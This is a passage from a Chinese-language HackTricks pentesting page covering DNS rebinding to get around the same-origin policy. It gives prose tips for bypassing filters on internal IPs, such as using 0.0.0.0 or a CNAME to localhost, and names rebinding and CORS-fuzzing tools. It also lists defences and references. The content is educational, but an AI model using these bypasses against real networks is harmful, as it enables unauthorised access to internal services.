<li>当浏览器检查这些记录时，它接收到两个IP地址。</li>
<li>如果浏览器决定首先使用攻击者的IP地址，攻击者可以提供一个有效负载，该有效负载对同一域执行HTTP请求。</li>
<li>然而，一旦攻击者获得受害者的IP地址，他们就停止响应受害者的浏览器。</li>
<li>受害者的浏览器在意识到该域无响应后，转而使用第二个给定的IP地址。</li>
<li>通过访问第二个IP地址，浏览器绕过同源策略（SOP），允许攻击者滥用这一点并收集和外泄信息。</li>
</ol>
<p>此技术利用了浏览器在为域提供多个IP地址时的行为。通过战略性地控制响应并操纵浏览器的IP地址选择，攻击者可以利用SOP并访问受害者的信息。</p>
<p>{% hint style="warning" %}
请注意，为了访问localhost，您应该尝试在Windows中重新绑定<strong>127.0.0.1</strong>，在Linux中重新绑定<strong>0.0.0.0</strong>。<br />
像godaddy或cloudflare这样的提供商不允许我使用IP 0.0.0.0，但AWS route53允许我创建一个具有两个IP的A记录，其中一个是"0.0.0.0"</p>
<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}
<p>有关更多信息，您可以查看<a href="https://unit42.paloaltonetworks.com/dns-rebinding/">https://unit42.paloaltonetworks.com/dns-rebinding/</a></p>
<h3 id="其他常见绕过"><a class="header" href="#其他常见绕过">其他常见绕过</a></h3>
<ul>
<li>如果<strong>不允许内部IP</strong>，他们可能<strong>忘记禁止0.0.0.0</strong>（在Linux和Mac上有效）</li>
<li>如果<strong>不允许内部IP</strong>，则响应<strong>CNAME</strong>到<strong>localhost</strong>（在Linux和Mac上有效）</li>
<li>如果<strong>不允许内部IP</strong>作为DNS响应，您可以响应<strong>CNAME到内部服务</strong>，例如www.corporate.internal。</li>
</ul>
<h3 id="dns重绑定武器化"><a class="header" href="#dns重绑定武器化">DNS重绑定武器化</a></h3>
<p>您可以在演讲<a href="https://www.youtube.com/watch?v=y9-0lICNjOQ">Gerald Doussot - State of DNS Rebinding Attacks &amp; Singularity of Origin - DEF CON 27 Conference</a>中找到有关先前绕过技术的更多信息以及如何使用以下工具。</p>
<p><a href="https://github.com/nccgroup/singularity"><strong><code>Singularity of Origin</code></strong></a>是一个执行<a href="https://en.wikipedia.org/wiki/DNS_rebinding">DNS重绑定</a>攻击的工具。它包括将攻击服务器DNS名称的IP地址重新绑定到目标机器的IP地址并提供攻击有效负载以利用目标机器上脆弱软件所需的组件。</p>
<h3 id="针对dns重绑定的真正保护"><a class="header" href="#针对dns重绑定的真正保护">针对DNS重绑定的真正保护</a></h3>
<ul>
<li>在内部服务中使用TLS</li>
<li>请求身份验证以访问数据</li>
<li>验证Host头</li>
<li><a href="https://wicg.github.io/private-network-access/">https://wicg.github.io/private-network-access/</a>：提议在公共服务器想要访问内部服务器时始终发送预检请求</li>
</ul>
<h2 id="工具"><a class="header" href="#工具"><strong>工具</strong></a></h2>
<p><strong>模糊可能的CORS政策配置错误</strong></p>
<ul>
<li><a href="https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8">https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8</a></li>
<li><a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></li>
<li><a href="https://github.com/lc/theftfuzzer">https://github.com/lc/theftfuzzer</a></li>
<li><a href="https://github.com/s0md3v/Corsy">https://github.com/s0md3v/Corsy</a></li>
<li><a href="https://github.com/Shivangx01b/CorsMe">https://github.com/Shivangx01b/CorsMe</a></li>
<li><a href="https://github.com/omranisecurity/CorsOne">https://github.com/omranisecurity/CorsOne</a></li>
</ul>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></li>
<li><a href="https://portswigger.net/web-security/cors/access-control-allow-origin">https://portswigger.net/web-security/cors/access-control-allow-origin</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS</a></li>
<li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties</a></li>
<li><a href="https://www.codecademy.com/articles/what-is-cors">https://www.codecademy.com/articles/what-is-cors</a></li>
<li><a href="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors">https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors</a></li>
<li><a href="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646">https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration</a></li>
<li><a href="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b">https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b</a></li>
</ul>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
学习和实践AWS黑客攻击：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践GCP黑客攻击：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord小组</strong></a>或<a href="https://t.me/peass"><strong>电报小组</strong></a>或<strong>在Twitter上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub库提交PR分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/hacking-with-cookies/cookie-bomb.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/crlf-0d-0a.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/hacking-with-cookies/cookie-bomb.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/crlf-0d-0a.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
